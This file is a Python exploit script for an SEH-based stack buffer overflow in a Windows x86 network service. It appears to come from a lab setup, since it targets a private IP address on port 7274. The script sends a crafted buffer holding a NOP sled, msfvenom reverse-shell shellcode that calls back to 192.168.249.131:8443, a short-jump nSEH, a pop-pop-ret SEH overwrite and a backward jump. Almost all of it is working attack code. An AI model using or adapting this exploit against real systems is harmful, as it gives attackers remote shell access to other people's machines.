#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# buffer overflow SEH windows x86
import sys
import socket
from struct import pack

host="192.168.249.141"  
port=7274

exp = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
exp.connect((host, port))

size = 4423
offset = b"\x90" * 80 # nop sled

# msfvenom -p windows/shell_reverse_tcp -a x86 -b '\x00\x0a\x29\x30\x50' LHOST=192.168.249.131 LPORT=8443 -f python

buf =  b""
buf += b"\x31\xc9\x83\xe9\xaf\xe8\xff\xff\xff\xff\xc0\x5e"
buf += b"\x81\x76\x0e\xa4\xda\x1c\x82\x83\xee\xfc\xe2\xf4"
buf += b"\x58\x32\x9e\x82\xa4\xda\x7c\x0b\x41\xeb\xdc\xe6"
buf += b"\x2f\x8a\x2c\x09\xf6\xd6\x97\xd0\xb0\x51\x6e\xaa"
buf += b"\xab\x6d\x56\xa4\x95\x25\xb0\xbe\xc5\xa6\x1e\xae"
buf += b"\x84\x1b\xd3\x8f\xa5\x1d\xfe\x70\xf6\x8d\x97\xd0"
buf += b"\xb4\x51\x56\xbe\x2f\x96\x0d\xfa\x47\x92\x1d\x53"
buf += b"\xf5\x51\x45\xa2\xa5\x09\x97\xcb\xbc\x39\x26\xcb"
buf += b"\x2f\xee\x97\x83\x72\xeb\xe3\x2e\x65\x15\x11\x83"
buf += b"\x63\xe2\xfc\xf7\x52\xd9\x61\x7a\x9f\xa7\x38\xf7"
buf += b"\x40\x82\x97\xda\x80\xdb\xcf\xe4\x2f\xd6\x57\x09"
buf += b"\xfc\xc6\x1d\x51\x2f\xde\x97\x83\x74\x53\x58\xa6"
buf += b"\x80\x81\x47\xe3\xfd\x80\x4d\x7d\x44\x85\x43\xd8"
buf += b"\x2f\xc8\xf7\x0f\xf9\xb2\x2f\xb0\xa4\xda\x74\xf5"
buf += b"\xd7\xe8\x43\xd6\xcc\x96\x6b\xa4\xa3\x25\xc9\x3a"
buf += b"\x34\xdb\x1c\x82\x8d\x1e\x48\xd2\xcc\xf3\x9c\xe9"
buf += b"\xa4\x25\xc9\xd2\xf4\x8a\x4c\xc2\xf4\x9a\x4c\xea"
buf += b"\x4e\xd5\xc3\x62\x5b\x0f\x8b\xe8\xa1\xb2\xdc\x2a"
buf += b"\x5d\x59\x74\x80\xa4\xfa\xe7\x0b\x42\xb0\x0c\xd4"
buf += b"\xf3\xb2\x85\x27\xd0\xbb\xe3\x57\x21\x1a\x68\x8e"
buf += b"\x5b\x94\x14\xf7\x48\xb2\xec\x37\x06\x8c\xe3\x57"
buf += b"\xcc\xb9\x71\xe6\xa4\x53\xff\xd5\xf3\x8d\x2d\x74"
buf += b"\xce\xc8\x45\xd4\x46\x27\x7a\x45\xe0\xfe\x20\x83"
buf += b"\xa5\x57\x58\xa6\xb4\x1c\x1c\xc6\xf0\x8a\x4a\xd4"
buf += b"\xf2\x9c\x4a\xcc\xf2\x8c\x4f\xd4\xcc\xa3\xd0\xbd"
buf += b"\x22\x25\xc9\x0b\x44\x94\x4a\xc4\x5b\xea\x74\x8a"
buf += b"\x23\xc7\x7c\x7d\x71\x61\xec\x37\x06\x8c\x74\x24"
buf += b"\x31\x67\x81\x7d\x71\xe6\x1a\xfe\xae\x5a\xe7\x62"
buf += b"\xd1\xdf\xa7\xc5\xb7\xa8\x73\xe8\xa4\x89\xe3\x57"


offset += buf
offset += b"A" * (size - len(offset))
nseh = b"\x90\x90\xeb\x06" # fixed asymmetric with nops + JMP SHORT 0x08
seh = pack('<L ', 0x727417EA) # pop pop ret address
shellcode = b"\x90" * 8  # nop sled
# nasm_shell -> jmp -4423 # shellcodetester
shellcode += b"\xe9\xdf\xee\xff\xff"  # jump back -4380 bytes, need to test to find the correct alignment 
payload = b"EXPLOIT2 " # specific string that need to pass to the vulnerable app in my case

buffer = payload + offset + nseh + seh + shellcode

print (f"Sending {len(buffer)} bytes..") 

exp.send(buffer)


exp.close()
